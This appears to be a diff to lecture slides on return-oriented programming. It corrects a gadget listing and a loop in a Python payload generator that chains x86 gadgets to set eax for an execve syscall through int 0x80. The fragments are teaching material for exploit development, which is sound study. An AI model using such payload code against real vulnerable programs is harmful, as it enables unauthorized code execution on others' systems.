@@ -117,7 +117,7 @@ mov eax, [ecx]; ret;
         \item System calls: Programs run in userspace with limited privileges, system calls allow to execute operations which require higher privileges.
     \end{itemize}
 \begin{lstlisting}[style=result]
-int 0x80; ret;
+int 0x80;
 \end{lstlisting}
 \end{frame}
 \subsection{ROP chain}
@@ -209,7 +209,7 @@ p += pack('<I', data + 8)
     \frametitle{Generating the payload: Init eax, call syscall}
     \begin{lstlisting}[style=code, language=python]
 p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
-for i in range(12):
+for i in range(11):
     p += pack('<I', inc_eax)
 p += pack('<I', int_80) # call interrupt
 print(str(p)[2:-1])
